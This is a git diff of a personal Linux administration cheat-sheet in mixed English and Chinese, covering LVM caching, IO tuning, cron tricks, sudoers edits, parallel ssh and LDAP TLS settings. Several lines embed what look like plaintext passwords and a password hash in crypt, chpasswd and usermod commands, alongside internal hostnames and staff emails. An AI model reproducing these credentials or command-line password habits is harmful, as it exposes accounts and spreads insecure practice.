+The * basically represents that we are setting these values for all the users except root. “soft or hard” basically represent soft or hard limits. 
+The next entry specifies the item for which we want to change the limit values i.e. nofile in this case which means the number of open files . 
+And finally we have the value we wanna set which in this case is 500000. The * here does not apply to a root user, hence the last two lines specially for the root user.
+
+After doing this, you need to take a reboot of the system. Sadly yes :( And the changes should reflect in the ulimit -n command.
+
+############ default update/scrape interval of monitoring softwares ###########
+prometheus  15s
+global:
+  scrape_interval:     15s # Set the scrape interval to every 15 seconds. Default is every 1 minute.
+zabbix    
+建item时间指定或template中指定, 默认 30s 或 1m  
+
+#########Centos7 lvm cache########
+# pvcreate /dev/sdb
+# vgextend centos /dev/sdb
+[root@lvmcache ~]# lvcreate --type cache-pool -l 100%FREE -n cpool centos /dev/sdb
+  Logical volume "cpool" created.
+[root@lvmcache ~]# lvs
+  LV    VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
+  cpool centos Cwi---C--- <19.96g
+  root  centos -wi-ao----  37.25g
+  swap  centos -wi-ao----  <3.82g
+[root@lvmcache ~]# lvconvert --type cache --cachepool centos/cpool centos/root
+Do you want wipe existing metadata of cache pool centos/cpool? [y/n]: y
+  Logical volume centos/root is now cached.
+[root@lvmcache ~]# lvs
+  LV   VG     Attr       LSize  Pool    Origin       Data%  Meta%  Move Log Cpy%Sync Convert
+  root centos Cwi-aoC--- 37.25g [cpool] [root_corig] 0.00   13.01           0.00
+  swap centos -wi-ao---- <3.82g
+[root@lvmcache ~]# lsblk
+NAME                  MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+fd0                     2:0    1    4K  0 disk
+sda                     8:0    0   50G  0 disk
+├─sda1                  8:1    0  476M  0 part /boot
+└─sda2                  8:2    0 41.1G  0 part
+  ├─centos-swap       253:1    0  3.8G  0 lvm  [SWAP]
+  └─centos-root_corig 253:4    0 37.3G  0 lvm
+    └─centos-root     253:0    0 37.3G  0 lvm  /
+sdb                     8:16   0   20G  0 disk
+├─centos-cpool_cdata  253:2    0   20G  0 lvm
+│ └─centos-root       253:0    0 37.3G  0 lvm  /
+└─centos-cpool_cmeta  253:3    0   20M  0 lvm
+  └─centos-root       253:0    0 37.3G  0 lvm  /
+[root@lvmcache ~]# lvs -a -o name,vg_name,size,pool_lv,devices,cachemode,chunksize
+  LV              VG     LSize   Pool    Devices         CacheMode    Chunk
+  [cpool]         centos <19.96g         cpool_cdata(0)  writethrough 64.00k
+  [cpool_cdata]   centos <19.96g         /dev/sdb(10)                     0
+  [cpool_cmeta]   centos  20.00m         /dev/sdb(5)                      0
+  [lvol0_pmspare] centos  20.00m         /dev/sdb(0)                      0
+  root            centos  37.25g [cpool] root_corig(0)   writethrough 64.00k
+  [root_corig]    centos  37.25g         /dev/sda2(0)                     0
+  swap            centos  <3.82g         /dev/sda2(9537)                  0
+[root@lvmcache ~]# lvs -a -o devices,cachetotalblocks,cacheusedblocks,cachereadhits,cachereadmisses
+  Devices         CacheTotalBlocks CacheUsedBlocks  CacheReadHits    CacheReadMisses
+  cpool_cdata(0)            326976               17               18              126
+  /dev/sdb(10)
+  /dev/sdb(5)
+  /dev/sdb(0)
+  root_corig(0)             326976               17               18              126
+  /dev/sda2(0)
+  /dev/sda2(9537)
+# detaching a cache pool
+# lvconvert --splicache centos/cpool
+=========================================================== 性能 ===========================================================
+
+########查IO########
+/etc/init.d/syslog stop
+echo 1 > /proc/sys/vm/block_dump
+dmesg | awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for (x in process) print process[x],x}' |sort -nr |awk '{print $2 " " $1}' | head -n 10
+echo 0 > /proc/sys/vm/block_dump
+/etc/init.d/syslog start
+
+##########netstat recv-q send-q解释#######
+LISTEN状态
+Recv-Q：代表建立的连接还有多少没有被accept，比如Nginx接受新连接变的很慢
+Send-Q：代表listen backlog值
+
+ESTAB状态
+Recv-Q：内核中的数据还有多少(bytes)没有被应用程序读取，发生了一定程度的阻塞
+Send-Q：代表内核中发送队列里还有多少(bytes)数据没有收到ack，对端的接收处理能力不强
+
+###########cgroup##############
+echo 40000 > /cgroup/cpu/libvirt/qemu/cpu.cfs_quota_us   
+cgset -r cpu.cfs_quota_us=40000 libvirt/qemu/
+cgget -g cpu libvirt/qemu/
+lscgroup
+
+############################IO tuning############
+avgrq-sz = ( rsec/s + wsec/s ) / (  r/s + w/s )
+  262.76 = (69175.98+ 3081.04) / (250.49+24.50) within the highlighted sample line 
+
+The svctm field is simply calculated from ( %util * 1000ms / #completed io per second ). 
+For example, ( 20.6% * 1000ms / 274.99 ) = 0.729ms per io
+svctm   = ( %util * 1000ms ) / (   r/s + w/s ) device "busy" time / # of completed io
+0.729ms = ( 20.6% * 1000ms ) / ( 250.49+24.50) which the highlighted sample line
+
+cat /sys/block/<sdX>/device/queue_depth
+#lsscsi -l
+
+The value of nr_requests determines the amount of I/O requests that get buffered before the I/O scheduler sends / receives data to the block device, if you are using a RAID card / Block Device that can handle a larger queue than what the I/O scheduler is set to, raising the value of nr_requests may help to improve throughout and reduce server load when large amounts of I/O occur on the server. If you are using Deadline or CFQ as the scheduler, it is suggested that you should set the nr_request value to 2 times the value of queue depth.
+
+echo 256 > /sys/block/sda/queue/nr_requests
+
+[root@oc1181188062 queue]# cat /sys/block/sda/queue/nr_requests 
+128
+[root@oc1181188062 queue]# cat /sys/block/sda/device/queue_depth 
+31
+#sg_map -x
+cfibml05:/proc/scsi/sg # cat /proc/scsi/sg/devices 
+0	2	0	0	0	1	256	0	1
+H       C       I       L       type           QD
+What is queue depth?
+The number of simultaneous requests on a drive's request queue
+queue depth of the disk controller
+
+########page in/out#########
+非hypervosor, page out 和 write相近, page in 和read相近
+centos-repo server
+# dstat -ar
+----total-cpu-usage---- -dsk/total- -net/total- ---paging-- ---system-- --io/total-
+usr sys idl wai hiq siq| read  writ| recv  send|  in   out | int   csw | read  writ
+  2   4  94   0   0   0| 356k    0 |3040B 1086B|   0     0 | 525   384 |18.0     0
+  3  12  85   0   0   0|  12M    0 |2620B  580B|   0     0 |2455  3472 | 790     0
+  4  15  81   0   0   0|  12M   61k|2426B  580B|   0     0 |2544  3444 | 765  2.00
+ 11  15  75   0   0   0|   0     0 |2778B  596B|   0     0 |1663   987 |   0     0
+ 10  15  75   0   0   0|   0     0 |3030B  678B|   0     0 |1926  1090 |   0     0
+  5  14  80   0   0   0|1060k    0 |2556B 1292B|   0     0 |3375  1885 |73.0     0
+  3   8  89   0   0   0|4332k    0 |2386B 1140B|   0     0 |2227  1977 | 315     0
+  3   8  89   0   0   0|2616k 2400k|2516B  678B|   0     0 |1997  1632 | 180  75.0
+  2   8  89   0   0   0|3540k    0 |2358B  596B|   0     0 |1943  1842 | 234     0
+  4  11  85   0   0   0|3264k    0 |1934B  580B|   0     0 |1998  1938 | 222     0
+  2  12  86   0   0   0|6468k    0 |2756B  580B|   0     0 |3054  2687 | 423     0
+  4  13  82   0   0   0|4544k 2432k|2584B  580B|   0     0 |2892  2539 | 302  76.0
+  5  13  82   0   0   0|5492k    0 |2488B  824B|   0     0 |2803  2036 | 344     0
+
+# sar -B 1  
+05:14:13 PM  pgpgin/s pgpgout/s   fault/s  majflt/s  pgfree/s pgscank/s pgscand/s pgsteal/s    %vmeff
+05:14:14 PM    292.00      0.00    588.00      1.00     98.00      0.00      0.00      0.00      0.00
+05:14:15 PM  12200.00      0.00   1786.00      0.00     70.00      0.00      0.00      0.00      0.00
+05:14:16 PM  11924.00     60.00   2270.00      0.00    366.00      0.00      0.00      0.00      0.00
+05:14:17 PM     64.00      0.00   2671.00      0.00   1173.00      0.00      0.00      0.00      0.00
+05:14:18 PM      0.00      0.00   2080.00      0.00   1211.00      0.00      0.00      0.00      0.00
+05:14:19 PM    696.00      0.00    260.00      0.00  42368.00  20371.00      0.00  20371.00    100.00
+05:14:20 PM   4448.00      0.00     18.00      0.00     39.00      0.00      0.00      0.00      0.00
+05:14:21 PM   2260.00   2400.00    309.00      0.00   5868.00   5642.00      0.00   5642.00    100.00
+05:14:22 PM   3584.00      0.00    439.00      0.00  10301.00  10188.00      0.00  10188.00    100.00
+05:14:23 PM   3788.00      0.00    606.00      0.00  12193.00  11866.00      0.00  11866.00    100.00
+05:14:24 PM   6504.00      0.00   1067.00      0.00  15926.00  15604.00      0.00  15604.00    100.00
+05:14:25 PM   3616.00   2432.00    807.00      0.00  35042.00  12450.00      0.00  12450.00    100.00
+05:14:26 PM   6404.00      0.00    550.00      0.00  11649.00  11450.00      0.00  11450.00    100.00
+
+####### CentOS7 tuned ##########
+profile里有一些cpu,disk,sysctl的调优参数
+tuned-adm active          #查看现在使用的profile
+tuned-adm profile throughput-performance         #切换到某profile
+
+DB类禁用透明大页
+[root@stjes1 ~]# vi /usr/lib/tuned/throughput-performance/tuned.conf
+add following lines:
+[vm]
+transparent_hugepages=never
+[root@stjes1 ~]# cat /sys/kernel/mm/transparent_hugepage/enabled
+[always] madvise never
+[root@stjes1 ~]# tuned-adm profile throughput-performance
+[root@stjes1 ~]# cat /sys/kernel/mm/transparent_hugepage/enabled
+always madvise [never]
+
+
+
+#######Google搜索技巧##########
+1 指定文件类型
+ELK介绍 filetype:pdf
+2 指定网站
+ELK site:slideshare.net
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+=========================================================== 脚本 ===========================================================
+
+#############crontab 每5秒执行一次脚本######
+## For excuting scripts.sh every 3 seconds##on 2014-10-15
+*/1 * * * *  /home/somedir/scripts.sh
+*/1 * * * * sleep 5 &&  /home/somedir/scripts.sh
+*/1 * * * * sleep 10 &&  /home/somedir/scripts.sh
+*/1 * * * * sleep 15 &&  /home/somedir/scripts.sh
+*/1 * * * * sleep 20 &&  /home/somedir/scripts.sh
+*/1 * * * * sleep 25 &&  /home/somedir/scripts.sh
+........
+
 ######################check all cronjob on server#############################
 for u in `grep -v '#' /etc/cron.allow`;do echo "========$u=========";crontab -u $u -l|egrep -v '^#|^$';done
 
-#######################################
-If you upgrade from RHEL 5 to an unsupported kernel, you might not be able to access data on the virtual machine's PVSCSI disks. 
-You can run vmware-config-tools.pl with the kernel-version parameter to regain access. 
+############ if判断 #################
+root@rabbit1:~# if [[ -n $(rabbitmqctl cluster_status | grep rabbit1) ]];then echo living;fi                  -n string长度非零返回真, 非空为真
+living
+root@rabbit1:~# if [[ ! -z $(rabbitmqctl cluster_status | grep rabbit1) ]];then echo living;fi                -z string长度为零返回真, 空为真
+living
 
-###########run in background######
-nohup cmd &
-setsid cmd
-(cmd &)
-CTRL-z    disown -h %1      https://linux.cn/article-7170-1.html
-screen
+##############operate shell variable #######
+for u in `cat 2`;do echo ${u%%.*};done      abc.cn.ibm.com ==>  abc
+for u in `cat 2`;do echo ${u#*.};done       abc.cn.ibm.com ==> cn.ibm.com
+a=abc.cn.ibm.com;echo ${a/abc/ABC}          abc.cn.ibm.com ==> ABC.cn.ibm.com
+a=abc.cn.ibm.com;echo ${a/.cn/}             abc.cn.ibm.com ==> abc.ibm.com
 
-##########backup file permission#########
-backup:   getfacl -R . > permission.txt
-restore:  setfacl --restore=permission.txt
+sed -i.20150303 '/^%usrmgt/i #\ LAN\ ID\ Team\n#include\ /etc/sudoers.d/104_MANIAMLinux_GLB_v1.2.3' /etc/sudoers
+sed -i.bk 's/^%usrmgt/#%usrmgt/' /etc/sudoers
+
+###查询安装 升级 删除的dpkg包### 
+pars for fun: install | remove | rollback
+function apt-history(){
+
+      case "$1" in
+        install)
+              grep 'install ' /var/log/dpkg.log
+              ;;
+        upgrade|remove)
+              grep $1 /var/log/dpkg.log
+              ;;
+        rollback)
+              grep upgrade /var/log/dpkg.log | \
+                  grep "$2" -A10000000 | \
+                  grep "$3" -B10000000 | \
+                  awk '{print $4"="$5}'
+              ;;
+        *)
+              cat /var/log/dpkg.log
+              ;;
+      esac
+}
+
+##### 文件系统使用率大于40% ######
+[root@repo-centos ~]# while read num t;do [ ${num%%%} -gt 40 ] && echo $num $t;done< <(df --output=pcent,target |tail -n +2)
+48% /mrepo
 
 
-####################scan sparse file larger than 1GB##########
-while read num file;do if [[ $(($num)) -lt 0 ]];then echo $file $(($num));fi;done< <(find / -type f -size +1G -print0|tee|xargs -0 stat -c "%b*%B-%s %n" --)
+$ curl -k -x http://10.67.124.210:808 https://raw.githubusercontent.com/fabric8io/docker-dirsrv-389ds/master/Dockerfile -o /c/Users/chensen/Dockerfile
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1260  100  1260    0     0    450      0  0:00:02  0:00:02 --:--:--   450
 
-##################koan######################
-[root@localhost ~]# koan --list=profiles --server=192.168.124.200
-- looking for Cobbler at http://192.168.124.200:80/cobbler_api
-centos-6.5-x86_64
-centos-6.5-x86_64-basic
-[root@localhost ~]# koan --replace-self --server=192.168.124.200 --profile=centos-6.5-x86_64-basic
-- looking for Cobbler at http://192.168.124.200:80/cobbler_api
-- reading URL: http://192.168.124.200/cblr/svc/op/ks/profile/centos-6.5-x86_64-basic
-install_tree: http://192.168.124.200/cblr/links/centos-6.5-x86_64
-downloading initrd initrd.img to /boot/initrd.img_koan
-url=http://192.168.124.200/cobbler/images/centos-6.5-x86_64/initrd.img
-- reading URL: http://192.168.124.200/cobbler/images/centos-6.5-x86_64/initrd.img
-downloading kernel vmlinuz to /boot/vmlinuz_koan
-url=http://192.168.124.200/cobbler/images/centos-6.5-x86_64/vmlinuz
-- reading URL: http://192.168.124.200/cobbler/images/centos-6.5-x86_64/vmlinuz
-- ['/sbin/grubby', '--add-kernel', '/boot/vmlinuz_koan', '--initrd', '/boot/initrd.img_koan', '--args', '"ks=http://192.168.124.200/cblr/svc/op/ks/profile/centos-6.5-x86_64-basic ksdevice=link kssendmac lang= text "', '--copy-default', '--make-default', '--title=kick1457640229']
-- ['/sbin/grubby', '--update-kernel', '/boot/vmlinuz_koan', '--remove-args=root']
-- reboot to apply changes
-[root@localhost ~]# reboot
-
-###################cobbler定制安装系统############
-# cobbler system add --name=test1 --mac=52:54:00:72:66:1a --interface=eth1 --static=1 --profile=centos-6.5-x86_64-basic --hostname=test1.example.com --netboot-enabled=true --name-servers="192.168.124.1"
-# cobbler system edit --name=test1 --interface=eth1 --ip-address=192.168.124.209
-# cobbler system report --name=test1
-  
-# cobbler system add --name=test2 --mac=52:54:00:99:ac:59 --interface=eth0 --static=1 --profile=centos-6.5-x86_64-basic --hostname=test2.example.com --netboot-enabled=true --name-servers="192.168.124.1"
-# cobbler system --name=test2 --interface=eth0 --ip-address=192.168.124.208
-# cobbler system edit --name=test2 --interface=eth0 --ip-address=192.168.124.208
-# cobbler system report --name=test2
-###########################################
-perl -e 'print crypt("Quake3@FB",q($1$x9cD$8)),"\n"'
-#############ssh in while loop######################
-while read srv user;do ssh -t $srv "sudo ls -l /home/${user}/.ssh/authorized_keys" </dev/null;done< <(cat h1|awk '{print $1,$2}')
-##############lssecfixes############################
-sudo ./lssecfixes -s other -H -d . -p |grep -v "N/A"
-rpm -qa --qf '%{name} %{version}-%{release} %{INSTALLTIME:date} \n'
-
-###################ssh key##########################
-[sam@oc1181188062 sshkey]$ cat au*.csv|awk -F',' '{print $1,$2,$3,$4,$6}'|egrep -i '/i/|/e/' |sort -k2,2 -k1,1 > personal_id.csv
-[sam@oc1181188062 sshkey]$ cat au*.csv|awk -F',' '{print $1,$2,$3,$4,$6,$NF}'|egrep -i '/s/|/f/' |sort -k2,2 -k1,1 > functionid_id.csv
-
-find /etc/sudoers -printf "%m\n"           440
-
-echo "scale=4;5200/5208" |bc
-
-dsh -M -f djs_bau "sudo /sbin/ifconfig eth1|grep -oP 'inet addr:\S+'|grep -oP '\d+.\d+.\d+.\d+'"
-dsh -M -f djs_bau "sudo /sbin/ifconfig eth0|grep -oP 'inet addr:\S+'|grep -oP '\d+.\d+.\d+.\d+'"
-#######################create ID#######################
-./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/db2 -g "busrsudo"
-./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/ihs -g "ihsadm ihssudo busrsudo"
-./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/was -g "wasadm wassudo busrsudo"
-./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/was_db2 -g "db2sudo wasadm wassudo busrsudo"
-
-###########################dsmc############
-dsmc rest "/opt/IBM/WebSphere/AppServer/logs/appLogs/RequestDeliveryCapabilityMED.log" "Nov20/" -ina -pick
-dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext01/httplogs/access_log*.gz" "ext01/" -ina -pick
-dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext02/httplogs/access_log*.gz" "ext02/" -ina -pick
-dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext02/httplogs/error_log*.gz" "ext02/" -ina -pick
-dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext01/httplogs/error_log*.gz" "ext01/" -ina -pick
-dsmc rest "/usr/*" /media/target/usr -sub=yes 
-dsmc q backup "/etc/openldap/slapd.conf"
-dsmc rest -pitd=04/16/2015 -pitt=15:08:51 "/etc/openldap/slapd.conf" /home/chensen/slapd.conf
-scp -r au04qws001djsr2 chensen@cn.ibm.com@w3-transfer.boulder.ibm.com:/w3/ibmconf/CSIRT_AU/2957
-
-############awk with external variable######
-var=999
-echo |awk -v A=$var '{print A}'
-or
-awk '{print $0 A}' A=$var filename
-
-############sed with variable#########
-cat test.txt |sed "s/$a/ABC/g"
-cat test.txt |sed 's/'$a'/ABC/g'
-
-###################when there's much difference between df and du############
-lsof | grep "(deleted)"            then restart app
-
-##################pssh with tunnel#################
-pssh -h djs_uat -x '-t -t -R 1880:b23leilapp01:80' --inline-stdout "sudo /usr/bin/yum list httpd"
-
-##################cssh with tunnel#################
-add below in .csshrc
-ssh_args=-R 1880:mrepos:80
-
-#################parellel #########################
-echo -e b28leidbp0{5..8}"\n"|xargs -n1 -P4 -i{} ssh {} "uname -n"
-seq 5 8|xargs -P4 -i{} ssh b28leidbp0{} ip a
-
-#!/bin/bash
-for u in `cat djs_prod`
-do
-(
-  ssh $u "uname -n;cat /etc/*release;whoami"
-)&
-done
-wait
-
-for u in `cat ID`;do grep $u /etc/passwd;done |grep -oP '\S+@in.ibm.com'
 ################extract ip addr#######################
 [sam@oc1181188062 ~]$ ip a|egrep -o "inet [^ ]*"|grep -oE "[0-9]+.[0-9]+.[0-9]+.[0-9]+"
 [sam@oc1181188062 ~]$ ip a|egrep -o "inet [^ ]*"|grep -oP "[0-9]+.[0-9]+.[0-9]+.[0-9]+"
@@ -1254,181 +1519,36 @@ eth0 9.115.106.177
 [sam@oc1181188062 ~]$ a=`ifconfig eth0`;a=${a#eth*addr:};a=${a%Bcast*};echo $a
 9.115.106.177
 
-#################script & scriptreplay##################
-script -t 2> timing.log -a output.session
-scriptreplay timing.log output.session
+#################.functions##################
+dokeychainmagic() {
+ checkagent=`ps auxww|egrep -v 'grep|defunct|gnome-session'|grep ^${USER}|grep -i ssh-agent|wc -l|awk '{print $1}'`
+ if [ "${checkagent}" -eq "0" ]; then
+    check-agent
+    dokeychainmagic
+ fi
 
-########################################################
-repeat() { while :; do $@ && return; sleep 30; done }
-cat -T file  # can display tab as ^I
-find . -iname '*.sh' -exec ./command.sh {} \;
-ls -C1|(while read u;do mv $u $u.bk;done)
-cat djs_uat1 |(while read srv user;do echo "=====$srv=====";ssh $srv "id $user" </dev/null;done)
-csplit status /SERVER/ -n 2 -s {*} -f server -b "%02d.log"
-[sam@oc1181188062 tmp]$ cat 1|echo $[ $(tr '\n' '+') 0 ]
-[sam@oc1181188062 tmp]$ cat 1|awk 'BEGIN{a=0}{a+=$0}END{print a}'
+#unset SSH_ASKPASS
 
-################awk print new line every 9 line####################
-dsh -M -f djs_uat -c "sudo /sbin/ip a"|awk '!(NR%9){print $0"\n";next}1'
+ if [ -x /usr/bin/keychain ] && [ -f $HOME/.ssh/id_dsa ] && [ "$checkagent" -le "1" ]; then
+   /usr/bin/keychain $HOME/.ssh/id_rsa --quiet >/dev/null 2>&1
+   source $HOME/.keychain/${HOSTNAME}-sh
+ else
+  if [ -f $HOME/.keychain/${HOSTNAME}-sh ] && [ "$checkagent" -ge "1" ]; then
+   source $HOME/.keychain/${HOSTNAME}-sh
+  fi
+ fi
+}
 
-##################join###################sort the file first
-join -j 1 -a1 -e " " -o '1.1,2.2' filea  fileb 
--a filenumber  # 1 or 2   -a1   all output for file num 1
--j FIELD   # key   equivalent to ‘-1 FIELD -2 FIELD’
--1 FIELD  
--2 FIELD   #compare field in file 1 and field in file 2
--e EMPTY   
--o FORMAT  # output format
--t CHAR    # use CHAR as input and output field separator
--i         # ignore lower/upper case
--v         # like grep -v    ignore matched data
-
-############check 100GB+ file sytem################
-for u in `cat djs_srvlist`;do echo "------$u------";ssh $u "bash -c $(printf '%q' "df -h|grep -v Size|xargs -n 6|grep '[0-9]\{3,\}G'")";done
-
-############xargs #################
-[sam@oc1181188062 tmp]$ xargs -a test.txt -n 2 -L 1 bash -c 'echo $0 " is " $1'
-a  is  man
-b  is  woman
-c  is  girl
-d  is  boy
-
-find . -name "*.mef3" -print0|xargs -0 -tI{} mv {} {}.bak
-cat BAU|xargs -n1 -P5 -i{} ssh {} uptime
-echo -e b28leidbp0{5..8}"\n"|xargs -n1 -P4 -i{} ssh {} "uname -n"
-seq 5 8|xargs -P4 -i{} ssh b28leidbp0{} ip a
-
-############vmware tool version############
-# dsh -M -f djs_srvlist -c "sudo /usr/bin/vmware-config-tools.pl --help 2>&1|grep Tools"
-
-###########RPM##############
-RPM can handle most of the permissions / ownerhsip problems
-
-rpm --setugids PACKAGE
-rpm --setperms PACKAGE
-
-######gpg #############
-gpg -c your_file.txt
-gpg -d your_file.txt.gpg > your_file.txt
-
-###########Checking for patterns tied to CPU X#########
-NOTE [psr] is the processor number where the [comm]and is running.
-
-ps -eo psr,pid,tid,class,rtprio,ni,pri,pcpu,stat,wchan:14,comm --sort=psr | sort | less
-
-############ipcalc#############
-[root@oc1181188062 ~]# ipcalc -p 10.12.218.255 255.255.252.0
-PREFIX=22
-[root@oc1181188062 ~]# ipcalc -n 10.12.218.255/22
-NETWORK=10.12.216.0
-[root@oc1181188062 ~]# ipcalc -b 10.12.218.22/24
-BROADCAST=10.12.218.255
-[root@oc1181188062 ~]# ipcalc -m 10.12.218.22/22
-NETMASK=255.255.252.0
-
-#############diff sdiff##########
-ifconfig |diff -y - 123.txt
-ifconfig |sdiff -w 132 - 123.txt
-
-############ksar###########
-# LC_TIME="POSIX" sar -f sa30 -A  | tee sar30 
-# ksar -input file:///home/sam/sar25 -outputPDF sar25.pdf
-
-####################swap#################
-top -> O -> p
-smem  -rs swap
-
-pidof memcached
-pgrep memcached
-grep --color VmSwap /proc/48440/status
-
-######################init=/bin/bash############################
-When the computer starts, it runs a program called "init", usually found at /bin/init or /sbin/init. This program is responsible for all the system startup and creating a usable environment.
-
-Specifying init=/bin/bash tells the kernel to run /bin/bash instead (which is a shell). Specifying rw tells the kernel to boot with the hard disk in read-write mode instead of read-only mode. Traditionally the kernel starts with the disk in read-only mode and a process later on checks the integrity of the disk before switching to read-write.
-
-############################DJS patch########################
-lssecfixes -pF -d . 2>/dev/null | awk '/N\/A/ { next ; } ; /^ / { print $1,"-",$4; }' | sed -e 's/ //g' | sort -du
-
-lssecfixes -pF -d . 2>/dev/null | awk '/N\/A/ { next ; } ; /^ / { print $1,"-",$4; }' | sed -e 's/ //g' | sort -du| xargs yum -C --exclude=kernel upgrade -y
-echo "kernel"|xargs yum -C install -y
-
-RUN /usr/sbin/vmware-tools-upgrader
-
-/usr/bin/vmware-config-tools.pl --default
-######vim########
-:%s/p1/p2/g
-:g/pattern/d
-:g/pattern/p
-
-##cheat####
-
-./useradd_linux -u list2 -r -s racv-l508 -g wasadmin
-ssh racv-l506 "sudo su - --command='find / -type f -name "authorized_keys*" -exec ls {} \; -exec ssh-keygen -lf {} \;'"
-ssh racv-l400 "sudo su - -c 'find / -type f -name "authorized_keys*" -exec ls {} \; -exec ssh-keygen -lf {} \;'"
-
-########查IO########
-/etc/init.d/syslog stop
-echo 1 > /proc/sys/vm/block_dump
-dmesg | awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for (x in process) print process[x],x}' |sort -nr |awk '{print $2 " " $1}' | head -n 10
-echo 0 > /proc/sys/vm/block_dump
-/etc/init.d/syslog start
-
-############racv############
-ssh -R 1880:9.190.26.244:80 racv-l402
-CH3773 
-as this is the latest available version in repository , same version will be installed on other servers as well in the rest changes
-
-#!/bin/bash
-# This sed grammar is not working on RHEL3
-sed -i '/^%usrmgt/i\\n\n# IPSOFT sudo access\nUser_Alias     IBM_AE_BAU = %automata\nHost_Alias    IBM_AE_HOSTS = ALL \nCmnd_Alias  IBM_UNIX_AE_BAU_CMDS =/usr/bin/su -, /bin/su -, /usr/bin/su - root, /bin/su - root\nIBM_AE_BAU  IBM_AE_HOSTS =  NOPASSWD:ALL, !IBM_NONE_SA,!IBM_SHELLS_ALL,IBM_UNIX_AE_BAU_CMDS,!IBM_SHELLESCAPE_ALL,!IBM_NONE_EDITOR\n\n' sudoers
-
-sed -i '/^%desktop_admin_r/r IPSOFT' sudoers   匹配行后插入文本
-
-perl -lne 'BEGIN{open(A,"IPSOFT");@f=<A>;}print;if(/^%desktop_admin_r/){print "\n\n @f \n\n"}' sudoers    匹配行后
-
-perl -lne 'BEGIN{open(A,"IPSOFT");@f=<A>;}if(/^%desktop_admin_r/){print "\n\n @f \n\n"};print' sudoers    匹配行前
-
-##########option D#############
-/etc/pam.d/password-auth:auth        required      /lib64/security/pam_listfile.so item=user sense=deny file=/etc/security/userlist onerr=succeed
-/etc/pam.d/system-auth:auth	    required	  /lib64/security/pam_listfile.so item=user sense=deny file=/etc/security/userlist onerr=succeed
-
-#######sudo * ############
-/bin/chown -R pcm\:pcm /pcm/[!".."]*,\
-	/bin/chown pcmdev\:pcmdev /pcm/[!".."]*,\
-	/bin/chown -R pcmdev\:pcmdev /pcm/[!".."]*,\
-	/bin/cat /pcm/[!".."]*,\
-	/bin/ln -s /pcm/[!".."]* *,\
-	/bin/mkdir /pcm/[!".."]*,\
-	/bin/mv /pcm/[!".."]* /pcm/[!".."]*,\
-	/bin/rm /pcm/[!".."]*,\
-	/bin/rmdir /pcm/[!".."]*,\
-	/usr/bin/tail /pcm/[!".."]*,\
-	/usr/bin/tail -f /pcm/[!".."]*
-
-############sudo ##########
-
-R5,R6,SUSE11        #include
-0750 /etc/sudoers.d
-0440 /etc/sudoers.d/sample
-
-###############smbldap#############
-pdbedit -Lv alewhite  Account Flags:        [UX          ]   X表示ID被锁
-pdbedit -z -c [] username     samba ID 解锁
-
-#########POODLE ldaps fix############
-TLSProtocolMin 768   # (3 << 8) disables SSLv2
-TLSProtocolMin 769   # ((3 << 8)+1) disables SSLv2 and SSLv3
-
-OpenLDAPのサーバ(slapd)でSSL 3.0を禁止にする方法。
-slapd.confのグローバルセクションに以下の1行を记载する。
-# SSL 3.0 (プロトコルのバージョン3.0 → 0x0300 → 10进数で768)
-# TLS 1.0 (プロトコルのバージョン3.1 → 0x0301 → 10进数で769)
-# TLS 1.1 (プロトコルのバージョン3.2 → 0x0302 → 10进数で770)
-# TLS 1.2 (プロトコルのバージョン3.3 → 0x0303 → 10进数で771)
-# OpenLDAP 2.4.36未満では「TLSProtocolMin 769」と指定する。
-# OpenLDAP 2.4.36以降では「TLSProtocolMin 3.1」と指定する。
-TLSProtocolMin 3.1
+# checks to see if theres an ssh-agent running
+check-agent() {
+ checkagent=`ps auxww|egrep -v 'grep|defunct|gnome-session'|grep ^${USER}|grep -i ssh-agent|wc -l|awk '{print $1}'`
+ if [ "${checkagent}" -eq "0" ]; then
+  echo "there is no ssh-agent running for ${USER}"
+  echo "Now, run ssh-agent for ${USER}..."
+   /usr/bin/keychain ~/.ssh/id_rsa
+#  exit 101
+ fi
+}
 
 #####################outputs of "ssh -V"##############
 ssh -V outputs to STDERR, not STDOUT.
@@ -1443,15 +1563,6 @@ ssh_version=$(ssh -V 2>&1)
 
 pssh -h nci2 -t 0 -x '-t -t' --inline-stdout "sudo `which lsof` -i:443,636" >scan
 
-##############operate shell variable #######
-for u in `cat 2`;do echo ${u%%.*};done      abc.cn.ibm.com ==>  abc
-for u in `cat 2`;do echo ${u#*.};done       abc.cn.ibm.com ==> cn.ibm.com
-a=abc.cn.ibm.com;echo ${a/abc/ABC}          abc.cn.ibm.com ==> ABC.cn.ibm.com
-a=abc.cn.ibm.com;echo ${a/.cn/}             abc.cn.ibm.com ==> abc.ibm.com
-
-sed -i.20150303 '/^%usrmgt/i #\ LAN\ ID\ Team\n#include\ /etc/sudoers.d/104_MANIAMLinux_GLB_v1.2.3' /etc/sudoers
-sed -i.bk 's/^%usrmgt/#%usrmgt/' /etc/sudoers
-
 ###############sudo###################
 sudo cat /etc/sudoers |grep '='|egrep -vi 'alias|default|^#'|awk '{print $1}'
 
@@ -1460,248 +1571,6 @@ pssh -h racv20160229 -x '-t -t' --inline-stdout "echo 'ycfang:new.pa550' |sudo /
 perl -e 'print crypt("pqhkR#8ctw",q($6$3eSjHzih)),"\n"'
 pssh -h djs_1 -x '-t -t' --inline-stdout sudo /usr/sbin/usermod -p "\$1\$SOWUrC9k\$aqc8hu0xZVUI7QveI5QrY/" xujintao  #ssh need escape, local doesn't need escape.
 
-############run EP2##############  
-EP2 4 check types:
-[chensen@cfibml08 ep2_mci]$ grep -ir violation *|awk '{print $NF}'|cut -d',' -f2|grep [^0-9]|sort -u
-checkOrphanFilesDirs
-checkPermsHomeDir
-checkProcessPerms
-checkWorldWritePerm
-
-pscp -h mcilist.txt -t 0 -p 20 -r EP2/ /home/chensen
